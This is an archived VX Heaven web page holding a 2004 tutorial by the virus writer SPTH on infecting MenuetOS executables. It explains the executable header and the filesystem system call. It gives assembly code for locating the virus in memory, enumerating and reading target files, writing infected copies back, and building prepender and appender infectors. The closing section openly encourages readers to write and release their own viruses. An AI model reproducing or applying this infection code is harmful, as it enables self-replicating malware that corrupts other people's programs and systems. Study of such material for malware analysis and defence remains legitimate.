<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> SPTH 'MenuetOS infection' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="SPTH"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, SPTH,MenuetOS infection, host, header, read, important, directory, write, attr, asciiz, menuet, information, fileinfo, dword, offset, block, point"/>
<meta name="Description" content="MenuetOS is a new and free Operating System with GUI (Graphical User Interface) and many network tools like a eMail program or a IRC client, which fits on one disk. The Operating System is fully assembler written and has a great documation, more than that, it's open source. You can find the OS here: www.menuetos.org. I got the idea of writing a virus for it, when I had the first contact with it: One boring day in a IRC-channel VxF talked about it, and joked about writing viruses for it. Well, that was the start of the whole story, and as I became bored of all that windows based virus, I thought it would be a nice challenge for me. About five month after that contact the first virus (Menuet.Oxymoron) was finished. As I had to learn alot of it by myself, I want to share this information with you. And that's also the only purpose of this article."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"ee78d1819e2bf12db8de3b6bc67fa0d7b63099d4-1498756762-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vsp06.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>MenuetOS infection</h1><p><a href="/lib/?lang=en&amp;author=SPTH"> SPTH</a><br/> <em><a href="/vx.php?fid=1375#f1375">Ready Rangers Liberation Front [5]</a></em><br/> <em>November 2004</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vsp06.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=OO#vsp06">Back to index</a>] [<a href="/lib/vsp06.html#disqus_thread">Comments</a>]<br/> 
<p><strong>Index</strong></p>
<ol start="0">
<li>Intro words</li>
<li>File Format
<ol type="a">
<li>General information</li>
<li>Application Structur</li>
<li>Header Information</li>
</ol></li>
<li>System Calls
<ol type="a">
<li>General Information</li>
<li>System Call 58</li>
</ol></li>
<li>Virus functions
<ol type="a">
<li>Find viruscode in memory</li>
<li>Find files</li>
<li>Directory entries</li>
<li>Read files to memory</li>
<li>Write memory to files</li>
</ol></li>
<li>Infection Type
<ol type="a">
<li>Prepender</li>
<li>Appender</li>
</ol></li>
<li>Last words</li>
</ol>
<h2>0) Intro words</h2>
<p>MenuetOS is a new and free Operating System with GUI (Graphical User Interface) and many network tools like a eMail program or a IRC client, which fits on one disk. The Operating System is fully assembler written and has a great documation, more than that, it's open source. You can find the OS here: www.menuetos.org. I got the idea of writing a virus for it, when I had the first contact with it: One boring day in a IRC-channel VxF talked about it, and joked about writing viruses for it. Well, that was the start of the whole story, and as I became bored of all that windows based virus, I thought it would be a nice challenge for me. About five month after that contact the first virus (Menuet.Oxymoron) was finished. As I had to learn alot of it by myself, I want to share this information with you. And that's also the only purpose of this article.</p>
<h2>1) File Format</h2>
<h3>a) General information</h3>
<p>MenuetOS first asks the user about the start configuration. After that it loads the files (from disk or harddisk) to the memory. There the data is available at directory '/RAMDISK/1/xxx'. The primary harddisk of your computer is saved as '/HARDDISK/1/xxx'. That's a basic information, and most important for the following dream (writing a MenuetOS virus).</p>
<h3>b) Application Structur</h3>
<p>The MenuetOS-file has a simple structur. It just consists of two parts: The Header and the executeable code. It looks like that:</p>
<pre>
           ----------------
           ---          ---
           ---  HEADER  ---
           ---          ---
           ----------------

           ----------------
           ---          ---
           ---  EXECUTE ---
           ---   ABLE   ---
           ---          ---
           ---   CODE   ---
           ---          ---
           ----------------
</pre>
<p>I will explain the header in the next part of the article. The executeable code contains your commands and your data, which must not be executed, therefor it will be intelligent if you write your data after the code, which means after the end of your application or after the jump to the host code. A very important information is, that every execution file are loaded at memory offset 0x0 (org 0x0). It's important because we could calculate with the static header informations and not any calculting any relative offsets. In that case, for instance the EP of the current file in memory is here: dword [0xC] (will be explained in the next part).</p>
<h3>c) Header information</h3>
<p>The header is the most important part you have to think of when you want to write a virus for this Operating System. There are two parts of header: the extanted and the not-extanted one. The not-extanted header consists of 0x1C (=28) bytes, which are very important. The extanted header has 8 bytes more than the other one, so it's size is 0x24 (=36) bytes. After the header some programs store important data, which means, the end of the header is not directly the beginning of the Executeable code.</p>
<p>Now I want to show you the Menuet's header, and explain the different parts and their use in a virus later on:</p>
<table border="1" cellspacing="0" cellpadding="0" summary="Menuet's header">
<tr><th>Offset</th><th>Length</th><th>Name</th></tr>
<tr><td>00h</td><td>8 bytes</td><td>File ID</td></tr>
<tr><td>08h</td><td>4 bytes</td><td>required OS</td></tr>
<tr><td>0Ch</td><td>4 bytes</td><td>Entry Point</td></tr>
<tr><td>10h</td><td>4 bytes</td><td>File length</td></tr>
<tr><td>14h</td><td>4 bytes</td><td>Used memory</td></tr>
<tr><td>18h</td><td>4 bytes</td><td>extanted header / esp</td></tr>
<tr><td>1Ch</td><td>4 bytes</td><td>Parameters</td></tr>
<tr><td>20h</td><td>4 bytes</td><td>Icon Information</td></tr>
</table>
<dl>
<dt>File ID</dt><dd>This 2 dword tell the OS, that it's an executeable file. The File ID should be 'MENUET00' or 'MENUET01'. I haven't found any difference between these two ways.</dd>
<dt>Required OS</dt><dd>This double word tells the OS, which version of MenuetOS it needs. Up to now (June 2004), Menuet exists in it's version 0.77. The dword of a program which just run at MenuetOS 0.77+ would contain the value '77'. But I have just seen two different values: 1 and 38. Due to this, and the fact, that it's not important for the file, we could use it as our virus sign. Just overwrite this value with a number less than 77 (but not 1 or 38 :] ).</dd>
<dt>Entry Point</dt><dd>This is also a very important value for our virus. Here we get the information where the file's code starts. This value could be 0x1c, if it's no extanted header without data or much bigger, if it contains alot of data. Anyway, this value is also very important for finding the virus code in memory. If it's a prepender, the virus is at EP or if it's an appender, this is the value you could change, so that the virus runs first.</dd>
<dt>File length</dt><dd>This is the next important value. It's the size of the file, which means: Headerlength+codelength. This value is generated when the file is compiled. That means, if you add some bytes (the virus), the value won't change, which is perfect for writing a virus. If you want to write a prepender, you could store the first part of the host code at that offset, or if you want to write an appender, you could add your viruscode here.</dd>
<dt>Used memory</dt><dd>The doubleword is the amount of memory reserved by OS for the application. As the virus also uses alot of memory (reading files, file rebuilding), this is very important. You have to check if the value is bigger than your required memory. If you infect a file using too few memory, the file won't work anymore.</dd>
<dt>Extanted Header / esp</dt><dd>This part of the header tells us, if it uses an extanted header or not. If the dword is 0x0, it doesn't use an extanted header. Otherwise it uses one. In that case, the value is the offset of the stack (esp). It's not important for the file, because pop/push always works without that offset.</dd>
<dt>Parameters &amp; Icon Information</dt><dd>These values are important for the host file, but not for us, therefor I won't explain it more exactly.</dd>
</dl>
<h2>2) System Calls</h2>
<h3>a) General information</h3>
<p>System Calls are the only way how you can communicate with the OS. Such a System call allow you to use general functions of the OS. To find information about that calls, you have to look at the sysfuncs.txt file included in the MenuetOS-package. There you can find the exact way of using every of the 66 (some of them aren't finished so far) calls. Generally a call looks like this:</p>
<pre class="source">
          eax = function numbers
          ebx, ecx, edx, esi, edi = information for the call
          int 0x40 = System call
</pre>
<p>An example - sysfuncs.txt contains this content:</p>
<pre class="source">
          05 = DELAY X/100 SECS

              ebx delay in 1/100 secs
              ret: nothing changed
</pre>
<p>If we want a 0.5 second delay in our program, we have to do it as the following code shows you:</p>
<pre class="source">
          mov  eax, 5	        ; Function number: DELAY X/100 SECS
          mov  ebx, 50          ; 50/100 sec = 0.5 seconds
          int  0x40             ; System call
</pre>
<h3>b) System Call 58</h3>
<p>System Call 58 is the only important function for our virus. Information about Function 58 by sysfuncs.txt:</p>
<pre class="source">
          58 = SYSTEM TREE ACCESS

               ebx    pointer to fileinfo block

               path examples:

               '/RAMDISK/FIRST/KERNEL.ASM',0
               '/RD/1/KERNEL.ASM',0

               '/HARDDISK/FIRST/KERNEL.ASM',0
               '/HD/1/KERNEL.ASM',0
               '/HARDDISK/FIRST/MENUET/PICS/TANZANIA.BMP',0

               fileinfo:

               dd   0                    ; 0=READ    (delete/append)
               dd   0x0                  ; 512 block to read 0+
               dd   0x1                  ; blocks to read (/bytes to write/append)
               dd   0x20000              ; return data pointer
               dd   0x10000              ; work area for os - 16384 bytes
               db   '/RAMDISK/FIRST/KERNEL.ASM',0  ; ASCIIZ dir &amp; filename

               or

               fileinfo:

               dd   1                    ; 1=WRITE
               dd   0x0                  ; not used
               dd   10000                ; bytes to write
               dd   0x20000              ; source data pointer
               dd   0x10000              ; work area for os - 16384 bytes
               db   '/RAMDISK/FIRST/KERNEL.ASM',0  ; ASCIIZ dir &amp; filename

               or

               ; LBA

               fileinfo:

               dd   8                    ; 8=LBA read (/9=LBA write)
               dd   0x0                  ; 512 block to read (write)
               dd   0x1                  ; set to 1
               dd   0x20000              ; return data pointer
               dd   0x10000              ; work area for os (16384 bytes)
               dd   '/HARDDISK/SECOND',0 ; physical device ; ASCIIZ

                    ( or /rd/1/ )

                    LBA read must be enabled with setup

               NOTE: The asciiz in this context refers to the physical device and
                     not to logical one.
                     For hd: first=pri.master, second=pri.slave
                             third=sec.master, fourth=sec.slave

               or

               fileinfo:

               dd   16                   ; 16=START APPLICATION
               dd   0x0                  ; nop
               dd   param                ; 0 or parameter area (ASCIIZ)
               dd   0x0                  ; nop
               dd   0x10000              ; work area for os - 16384 bytes
               db   '/HD/1/MENUET/APPS/FIRE',0  ; ASCIIZ dir &amp; filename

               ret: eax = pid or 0xfffffff0+ for error
</pre>
<p>This way we can find files, read file contents and write files, but this be explained later on.</p>
<h2>3) Virus functions</h2>
<h3>a) Find viruscode in memory</h3>
<p>Finding the code of the virus in memory is very important for the virus, otherwise you can't infect other files. Now there are two ways to find the code, which depends on what kind of virus it is - a prepender or appender. (I don' think of EPO infectors so far). The easiest way to find the code is a call, and you pop your offset from the stack to a register. But a bad thing at saving it in a register is, that you can't use that register anymore (because the offset must not be overwritten). Information about CALL by OPCODES2.HLP:</p>
<blockquote>Pushes Instruction Pointer (and Code Segment for far calls) onto stack and loads Instruction Pointer with the address of proc-name.</blockquote>
<p>If you call a lable at the start of the virus, the stack contains the offset call. And that's the assembler source for this way:</p>
<pre class="source">
                call    virus           ; Push current memory offset to stack
         virus:
                pop     ecx             ; Pop current memory offset to ecx
                sub     ecx, 5          ; Get the startoffset of the viruscode in memory
                xchg    ebp, ecx        ; Move ecx to ebp &lt;- NOTE: You must not pop ebp,
                                        ;                    otherwise the OS freezes.
</pre>
<p>As I told you, there is another way to find the Virusstart-offset, I'll tell you now: Prepender: This type infects files before the real code = at the Entry Point.</p>
<p>As you know from header-information that the Entry Point of the code is at offset dword [0xC] and the application is loaded at org 0x0, we can use the following code:</p>
<pre class="source">
          mov   ebp, dword [0xC]        ; ebp = 0x0 + dword [0xC]
</pre>
<p>Appender: The other type of viruses infects files behind the file. Now we know the memory start of the file (org 0x0), and the filelength of the infected file: dword [0x10]. So we can do the same thing again.</p>
<pre class="source">
          mox ebp, dword [0x10]         ; ebp = 0x0 + dword [0x10]
</pre>
<h3>b) Find files</h3>
<p>This is of corse on of the most important parts of a virus, and in MenuetOS it's not that easy. The reason for that is, that there is no direct function for it. But, as I have told you, we have SYSTEM CALL 58, which could do that for us. With function 58 we can read files, but not only, we can even read directory entries. Just look at the following example:</p>
<pre class="source">
          mov  eax, 58
          mov  ebx, dir_block
          int  0x40

          dir_block:
               dd   0                    ; 0=READ
               dd   0x0                  ; size of reading block: 512 + x
               dd   0x16                 ; blocks to read = 16*512 = 8192 bytes
               dd   0x20000              ; Offset where to save data
               dd   0x10000              ; work area for os - 16384 bytes
               db   '/RAMDISK/FIRST',0   ; Directory Name
</pre>
<p>Now we have the directory entries at memory offset 0x20000. The exact information about that will follow in the next capture. For now it's just important to know, that the first filename (always 11 letters) is at offset 0x0, and the whole information of one file is 32 bytes. That means, you can find files here: 0x0, 0x20, 0x40, 0x60, ... As we read 16*512 bytes, we got 100 files. You could get the filenames with a code like that:</p>
<pre class="source">
                   mov  ebx, 0x20000    ; Offset in memory

          nextfile:
                  add   ebx, 32	        ; Get next file-start-offset
                  cmp   ebx, 0x22000    ; Compair if we got all file
                  jne   nextfile        ; If not, get next file
</pre>
<h3>c) Directory Entries</h3>
<p>Last capter talked about finding files via Directory Entries, but so far I haven't explained you the 32 bytes of a file. Well, here we are. The Directory Entry contains important informations like the file attributes or the information about a deleted file. We have to use this informations for avoiding the infection of deleted files or directories. If we don't avoid them, the virus will freeze the system. Now look at the following list:</p>
<pre class="source">
          struct msdos_dir_entry {
          __u8name[8],ext[3];/* name and extension */       &lt;-- IMPORTANT
          __u8attr;/* attribute bits */                     &lt;-- IMPORTANT
          __u8    lcase;/* Case for base and extension */
          __u8ctime_ms;/* Creation time, milliseconds */
          __u16ctime;/* Creation time */
          __u16cdate;/* Creation date */
          __u16adate;/* Last access date */
          __u16   starthi;/* High 16 bits of cluster in FAT32 */
          __u16time,date,start;/* time, date and first cluster */
          __u32size;/* file size (in bytes) */              &lt;-- IMPORTANT
          };
</pre>
<p>I have already told you, that the first 11 bytes contain the file name. But it contains also another information: If the first byte of the filename is 0xE5, we have a deleted file. To avoid them you should compair the first byte of the filename with 0xE5, and if it's equal, get the next file.</p>
<p>The attribute bytes contains 7 values:</p>
<pre class="source">
          #define ATTR_NONE    0  /* no attribute bits */
          #define ATTR_RO      1  /* read-only */
          #define ATTR_HIDDEN  2  /* hidden */
          #define ATTR_SYS     4  /* system */
          #define ATTR_VOLUME  8  /* volume label */
          #define ATTR_DIR     16 /* directory */           &lt;-- IMPORTANT
          #define ATTR_ARCH    32 /* archived */
</pre>
<p>If ATTR_DIR = 1, we have a directory, and we should avoid to infect it. To do this, you could use the following code:</p>
<pre class="source">
          mov   cl, [ebx+11]    ; Move the attribute bits to cl
          and   cl, 0x10        ; AND 0x10 ( ???1 ???? = FOLDER )
          jnz   nextfile        ; If not zero, get next file
</pre>
<p>The last important part of the Directory Entries is the filesize. You need the filesize for reading the file to memory, because MenuetOS don't allow us to read a whole file, but we have to include the length which we want to read.</p>
<h3>d) Read files to memory</h3>
<p>We have to read our filecontent to the memory, because we just can infect the file (= include the virus code and do some other stuff) in memory. To do that, we have to search the System Call, which can do it. Well, the call is´, again, the function 58. Look at a code reading a file:</p>
<pre class="source">
          mov   eax, 58
          mov   ebx, fileinfo
          int   0x40


          fileinfo:

               dd   0                    ; 0=READ
               dd   0x0                  ; 512+x / block to read
               dd   0x1                  ; blocks to read
               dd   0x20000              ; return data pointer
               dd   0x10000              ; work area for os - 16384 bytes
               db   '/RAMDISK/FIRST/FILENAME',0  ; ASCIIZ dir &amp; filename
</pre>
<p>Now we two problems: First: We don't know how much blocks we have to read (because every file has a different filesize) and second we don't have the filename at the fileblock. We just have both information at the Directory Entry. What to do? As our code is executed at 0x0 in memory, we could write that informations to memory via 'stos'. But one more problem: The filesize at the Directory Entry is stored in bytes, but we need the blocks we have to read. A solution is the Assembler-command 'shr'.</p>
<blockquote>Shifts the destination right by "count" bits with zeroes shifted in on the left. The Carry Flag contains the last bit shifted out.</blockquote>
<p>Let me show you, how that works. Let's say, we have a file with the size with 10.000 bytes:</p>
<pre class="source">
          mov eax, filesize     &lt;-- eax = 10011100010000b
          shr eax, 9            &lt;-- eax = 10011b = 19d = 19 blocks
          inc eax               &lt;-- eax = 20d
                                &lt;-- 20*512 = 10.240 = we read got all bytes of the file
</pre>
<p>Let's have a look at that:</p>
<pre class="source">
          ;; ebx=offset of filename at Directory Entry

          mov   eax, dword [ebx+28]     ; Move the filesize to eax
          shr   eax, 9                  ; Get the blocks to read
          inc   eax		        ; For reading the last not completed block

          mov   edi, flb_bs             ; Move the offset of the
          stosb                         ; Write [al] to di in memory (number of blocks to flb_bs)

          mov   ecx, 11                 ; Move 11 to ecx (counter=11)
     fn2fb:                             ; File Name to File Block
          mov   al, [ebx]               ; Move the ebx-value to al
          stosb                         ; Write al to memory at offset edi (=11 letter buffer)
          inc   ebx                     ; Get next letter
     loop       fn2fb                   ; Jump to fn2fb if ecx>0 &amp;&amp; dec ecx

          mov   eax, 58                 ; SYSTEM TREE ACCESS
          mov   ebx, fileblock          ; ebx=offset of fileblock
          int   0x40                    ; SYSTEM CALL

          file_block:
                  dd   0
                  dd   0x0
          flb_bs: dd   0x1              ; How much blocks to read (filesize/512)
                  dd   0x25000          ; Here the filecontent will be stored
                  dd   0x10000
                  db '/RAMDISK/FIRST/'  ; This is the Direction we want to infect
          fle     db '           ',0    ; The 11 byte buffer for the filename 0-ended
</pre>
<p>This way we read the whole file to 0x25000 in memory. We just have to rewrite the code in memory and write the memory-content at that offset back to the file.</p>
<h3>e) Write memory to files</h3>
<p>After rewriting the file in memory, we have to write the file back. All we need we have. The filename in memory in the file-block, the numbers of blocks at the right address. The only thing we have to do is to change the first dword in the file-block. This dword is the kind of action (read/write, append and delete aren't ready so far). Well, we could use two different fileblocks, but that way we have to copy the filenames and the numbers of blocks. Well, I'll explain how to do it with one block. We have to write at address of file_block beginn the option 1. Let's look at the source:</p>
<pre class="source">
          add   edi, file_block  ; Offset of fileblock
          mov   al, 1            ; What to write (1 for writing)
          stosb                  ; Write al to memory at offset edi

          mov   eax, 58          ; SYSTEM TREE ACCESS
          mov   ebx, file_block  ; File_block offset to ebx
          int   0x40             ; SYSTEM CALL

          file_block:
                  dd   0                ; First it's read, but we need write
                  dd   0x0
          flb_bs: dd   0x1              ; How much blocks to read (filesize/512 - still there)
                  dd   0x25000          ; The content of this offset will be written to the file
                  dd   0x10000
          filen   db '/RAMDISK/FIRST/'  ; This is the Direction we want to infect
          fle     db '           ',0    ; The 11 byte buffer for the filename 0-ended (still there)
</pre>
<p>This code writes the 'WRITE-option' to fileblock-start, and then write flb_bs*512 bytes to filen until there is a NULL. The full filename and the numbers of fileblocks to write are still there because of the reading before.</p>
<h2>4) Infection Type</h2>
<h3>a) Prepender</h3>
<p>A Prepender virus infects its victim infront of the original host code and stores the code of the first part of the file at the end of the file. Such a file looks like that:</p>
<pre>
          Uninfected Sample:           Infected Sample:

          ++++++++++++                 +++++++++++++
          ++        ++                 ++         ++
          ++ HEADER ++                 ++ HEADER  ++
          ++        ++                 ++         ++
          ++++++++++++                 +++++++++++++
          ++++++++++++                 *************
          ++        ++                 **  VIRUS  **
          ++  HOST  ++                 *************
          ++        ++                 +++++++++++++
          ++  CODE  ++                 ++ REST OF ++
          ++        ++                 ++   HOST  ++
          ++++++++++++                 +++++++++++++
                                       #############
                                       ##  START  ##
                                       ## OF HOST ##
                                       #############
</pre>
<p>The virus searchs for the filesize of the host first. Than it copies the first bytes, which will be the virus-buffer, to an offset. This offset depends on the filesize. If the virus+header of file is bigger than the file, we would overwrite the restored bytes with the virus. Under that contition we have to restore the code at offset [viruslength+headerlenght]. Otherwise, if the file is bigger, we have to write the first hostpart at the end of the file. Next step is to infect the file, which means to insert the virusbody to the buffer at the filestart. The filestart is, as we already know, at offset 'dword [0xC]' stored. The filelength is at offset 'dword [0xC]'. After successful execution of the virus, we give the control back to the host. We have to write the original host-start (which is at the end of the file = dword [0x10] or at dword [0xC]+viruslength: You just have to check) back to the real file-start (dword [0xC]). We have to write the length of the virus to the filestart. But now we have one big problem: We can't overwrite our code as long as it is still running (writing back the host), so we have to be tricky: We write the restoring code for the host to a unused memory address and jump to that address.</p>
<p>Look at the source:</p>
<pre class="source">
          rebu:                         ; Rebuild the host code
                mov     ebx, dword [0x10]        ; Move the file length to ebx, to get the old hostcode offset

                mov     edx, dword [0xC]        ; Move the offset of the head-length to edx
                add     edx, viruslength        ; Add the viruslength to edx

                cmp     ebx, edx        ; Check if the file is smaller than the virus
                jge     notsmall2       ; If not greater or equal, go on

                mov     ebx, edx        ; Move the new offset to ebx

           notsmall2:

                mov     edi, dword [0xC]        ; Where to write: 0xC
                mov     ecx, viruslength        ; How much to write

               rbhc:                    ; Rebuild host code
                mov     al, [ebx]       ; One byte of the saved host code to al
                stosb                   ; Write al (Host code) to edi (Entry Point of file)
                inc     ebx             ; Get next byte
               loop rbhc                ; Jump to rbch if ecx>0 &amp;&amp; inc ecx

               jmp      dword [0xC]     ; Jump to Entry Point, now with the original code
           rebuend:                     ; Rebuild host code: End
</pre>
<h3>b) Appender</h3>
<p>This is the second infection type. This kind of virus copies the virus after the whole file and modifies the header, exactly the Entry Point. After the infection is finished, the virus restores jumps the original Entry Point. The infected file looks like this:</p>
<pre>
          Uninfected Sample:           Infected Sample:

          ++++++++++++                 ++++++++++++++
          ++        ++                 ++ MODIFIED ++
          ++ HEADER ++                 ++  HEADER  ++
          ++        ++                 ++          ++
          ++++++++++++                 ++++++++++++++
          ++++++++++++                 ++++++++++++++
          ++        ++                 ++          ++
          ++  HOST  ++                 ++   HOST   ++
          ++        ++                 ++          ++
          ++  CODE  ++                 ++   CODE   ++
          ++        ++                 ++          ++
          ++++++++++++                 ++++++++++++++
                                       **************
                                       **  VIRUS   **
                                       ** JUMP TO  **
                                       **    EP    **
                                       **************
</pre>
<p>An Appender searchs for the filesize and copies itself to that offset. After that, it searchs for the Entry Point, overwrite it with the virusstart (dword [0xC]=dword[0x10]). Than it writes the original Entry Point to the offset of the jump, which gives back the control to the host. This way MenuetOS will execute the virus infront of the host, which will be executed after the virus starts.</p>
<h2>5) Last words</h2>
<p>Finally, I want to say that I'm very happy after finish this article. This project (MenuetOS) used some hunderts of hours. First I had to analyse the way MenuetOS works, than I had to read many sources of Menuet-executeables, and I tried to understand them (which was sometimes very hard, because not everything was explained). Than learning about the Systemcalls and other Menuet things was nessecary. Next step to learn was the file-format (at least the header). Time went on, and I stared to understand how everything worked. Simple codes by me did what they were suposed to do, and out of some simple codes, a new virus was born. The reason, why I have written this article is the fact, that I didn't want to let the whole informations I collected last few month became lost. Well, here is that collection. In the end, and this should be it, it's important for me to say 'Thank You' to some persons, who were very important for all my MenuetOS descovering:</p>
<dl>
<dt>Ville Mikael Turjanmaa</dt><dd>The main-coder and founder of MenuetOS. (www.menuetos.org) You seems to be a really cool and damn smart guy. MenuetOS is a great field for learning about assembly language and OS developing. It really helped me alot to increase my asm knowlegde. This way I want to say Thanks for you, and also for your interesting email-answere. Please keep on working on that tool, and maybe you will also include a little AV for that OS. ;) Take care!</dd>
<dt>VxF</dt><dd>The guy, who introduced me in Menuet and inspire me in writing a virus for it. Much thanks for that all. And also much thanks for everything else you have ever done for me, you're one of the most important guys in my cyberlife...</dd>
<dt>jpelczar</dt><dd>The great progging-freak and Menuet-messiah at #MenuetOS. Without you, nobody could read this article, therefor a big thanks for all the time you offered to explain me different strange things at MenuetOS' behaviour. Big sorry that I didn't say what for i need all the information, I hope you don't hate me because of that.</dd>
<dt>SlageHammer</dt><dd>The damn friendly guy in IRC, who knows help for every problem. Molto grazie per tutti hai fatto per me. (damn, my italian is even worse than my english) :D And thanks for telling me about the KAV name of my virus (Menuet.Xymo.a)!</dd>
<dt>Music:</dt><dd>
<dl>
<dt>Theatre Of Tragedy</dt><dd>Thank you for your relaxing gothic sound. It helps alot listening to your music after 2 hours of no success at anything. You inspire me to on, and let me feel like a god! :)</dd>
<dt>Darkfall &amp; Stuck Mojo</dt><dd>Great trash metal, which makes me feel better than a god after finishing any part of the code, leting a code do what it's suposed to do, and so on. It gives me the needed energy for working on the next part.</dd>
<dt>Music of the 60s, 70s &amp; 80s</dt><dd>Great bands like Uriah Heep, KISS, ACDC, The Byrds, Deep Purple, Scorpions, Iron Maiden, CCR, Manowar and so on give a cool and relaxed feeling, which is important for writing and coding...</dd>
</dl></dd>
</dl>
<p>But I don't want to just thank these guys above, but also YOU, reader. Thank you for reading this piece of code. I really hope that you have enjoyed this and that you learned some things (maybe not alot, but maybe some little things). I would be happy as hell if you would write your own virus for MenuetOS (and, of course, release it). It's not very difficult, so just try it! Last hello goes to my RainBow, thanks for being with me! Last thing I want to say is: see you out there soon...</p>
<pre>
                                                        - - - - - - - - - - - - - - -
                                                          Second Part To Hell/[rRlf]
                                                          www.spth.de.vu
                                                          <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="582b282c3018282a313d2b2c763b3735">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
                                                          written from march-june 2004
                                                          Austria
                                                        - - - - - - - - - - - - - - - 
</pre>[<a style="" href="/lib/?lang=EN&amp;index=OO#vsp06">Back to index</a>] [<a href="/lib/vsp06.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vsp06">de</a><a href="/lib/index.php?lang=en&amp;id=vsp06">en</a><a href="/lib/index.php?lang=es&amp;id=vsp06">es</a><a href="/lib/index.php?lang=it&amp;id=vsp06">it</a><a href="/lib/index.php?lang=fr&amp;id=vsp06">fr</a><a href="/lib/index.php?lang=pl&amp;id=vsp06">pl</a><a href="/lib/index.php?lang=ru&amp;id=vsp06">ru</a><a href="/lib/index.php?lang=ua&amp;id=vsp06">ua</a></div>
</body>
</html>
